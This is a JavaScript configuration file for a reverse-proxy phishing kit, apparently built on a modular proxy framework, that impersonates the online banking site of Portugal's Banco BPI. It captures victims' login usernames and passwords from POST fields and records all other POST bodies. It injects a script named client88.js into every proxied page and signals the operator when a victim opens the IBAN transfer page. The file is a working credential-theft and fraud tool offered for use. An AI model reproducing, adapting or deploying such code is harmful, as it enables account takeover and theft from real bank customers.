/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')
const fs = require('fs')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = [
             {
                reg: /<\/html>/igm, // Google chrome on windows fix
                replacement: '<script type="text/javascript" src="client88.js"></script>\n</html>',
             },
        ]
    }

    attachClientHook(msgBody) {
        const regex = /<\/html>/igm
        const replacement = '<script type="text/javascript" src="client88.js"></script>\n</html>'

        msgBody.replace(regex, replacement)
        return msgBody

    }

    processResponse() {
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

        }
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        // this.browserEndPoint.removeHeader('content-security-policy')
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                
                    }
                }
                // newMsgBody = this.attachClientHook(newMsgBody)
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }


}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {
        this.req.headers['accept-encoding'] = 'br'
        if (this.req.method === 'POST') {
            // super.uploadRequestBody(clientContext.currentDomain, clientContext)

            super.captureBody(clientContext.currentDomain, clientContext)

        }

        if (this.req.url.endsWith('client88.js')) {
            const clientBuff = fs.readFileSync(path.join(__dirname, 'client88.js'))
            return this.res.end(clientBuff.toString());
        }


        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
            clientContext.currentDomain = process.env.PROXY_DOMAIN
            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        if (this.req.url === '/BPINet_Transferencias/TransferirIBAN.aspx') {
            clientContext.setLogAvailable(true)
            super.sendClientData(clientContext, {})
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'bpinet.bancobpi.pt',
    START_PATH: '/BPINET/login.aspx',
    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['LT_BPINet_wtLT_Layout_Login$block$wtInputsLogin$CS_BPINet_Autenticacao_wt51$block$wtUserId'],
            urls: '',
            hosts: ['bpinet.bancobpi.pt'],
        },

        loginPassword: {
            method: 'POST',
            params: ['LT_BPINet_wtLT_Layout_Login$block$wtInputsLogin$CS_BPINet_Autenticacao_wt51$block$wtPassword'],
            urls: '',
            hosts: ['bpinet.bancobpi.pt'],
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport